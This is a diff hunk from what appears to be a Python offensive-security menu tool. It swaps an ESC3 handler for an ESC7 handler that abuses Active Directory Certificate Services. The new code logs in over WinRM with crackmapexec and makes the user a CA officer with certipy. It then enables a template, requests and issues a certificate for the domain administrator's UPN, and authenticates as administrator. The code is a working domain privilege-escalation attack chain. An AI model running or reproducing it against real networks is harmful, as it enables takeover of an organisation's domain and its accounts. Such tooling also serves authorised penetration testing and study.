@@ -4394,40 +4394,43 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Certipy EC02
+# Details : Menu option selected - Certipy EC07
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='703':
-      print("[!] ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users.\n")
-#     ADD checkParams here...      
-      print(colored("[*] Checking privilges...", colour3))      
-      remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
-      catsFile("priv.tmp")
-      with open("priv.tmp") as file:
-         contents = file.read()
-         if "SeMachineAccountPrivilege" in contents:
-            print(colored("[*] Checking certificate authorities...", colour3))            
-            localCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -dc-only -stdout > test.tmp")
-            localCOM("cat test.tmp | grep  'Certificate Authorities'")
-            authority = input("\n[?] Please enter authority name to assign: ")
-            print("") 
-            print(colored("\n[*] Checking templates...", colour3))            
-            localCOM("cat test.tmp | grep  'Template Name'")
-            localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -add-officer " + USR.rstrip(" ") + " -ca " + authority)            
-            template = input("\n[?] Please enter template name to assign: ")
-            print("")   
-            localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca " + authority + " -enable-template " + template)
-            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca " + authority + " -template " + template + " -upn administrator@" + DOM.rstrip(" ") + " -target " + DOM.rstrip(" "))
-            templateNumber = input("\n[?] Please enter request id to assign: ")
-            print("")
-            print(colored("[*] Creating fake administrator certificate...", colour3))
-            localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca " + authority + " -issue-request " + templateNumber)
-            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca " + authority + " -target " + DOM.rstrip(" ") + " -retrieve " + templateNumber)
-            print(colored("\n[*] Fake administrator account created...", colour3))
-            localCOM("certipy auth -pfx administrator.pfx -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -username administrator")
-         else:
-            print("[-] SeMachineAccountPrivilege is not enabled...")
+   if selection =='707':
+      print("[!] ESC7 is when a user has the Manage CA or Manage Certificates access right on a CA. There are no public techniques that can abuse the Manage Certificates access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests.\n")
+      checkParams = test_TIP()
+      if checkParams != 1:
+         checkParams = test_DOM()      
+      if checkParams != 1:
+         print(colored("[*] Checking privilges...", colour3))      
+         remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
+         catsFile("priv.tmp")
+         with open("priv.tmp") as file:
+            contents = file.read()
+            if "SeMachineAccountPrivilege" in contents:
+               print(colored("[*] Checking certificate authorities...", colour3))            
+               localCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -dc-only -stdout > test.tmp")
+               localCOM("cat test.tmp | grep  'Certificate Authorities'")
+               authority = input("\n[?] Please enter authority name to assign: ")
+               print("") 
+               print(colored("\n[*] Checking templates...", colour3))            
+               localCOM("cat test.tmp | grep  'Template Name'")
+               localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -add-officer " + USR.rstrip(" ") + " -ca " + authority)            
+               template = input("\n[?] Please enter template name to assign: ")
+               print("")   
+               localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca " + authority + " -enable-template " + template)
+               localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca " + authority + " -template " + template + " -upn administrator@" + DOM.rstrip(" ") + " -target " + DOM.rstrip(" "))
+               templateNumber = input("\n[?] Please enter request id to assign: ")
+               print("")
+               print(colored("[*] Creating fake administrator certificate...", colour3))
+               localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca " + authority + " -issue-request " + templateNumber)
+               localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca " + authority + " -target " + DOM.rstrip(" ") + " -retrieve " + templateNumber)
+               print(colored("\n[*] Fake administrator account created...", colour3))
+               localCOM("certipy auth -pfx administrator.pfx -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -username administrator")
+            else:
+               print("[-] SeMachineAccountPrivilege is not enabled...")
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
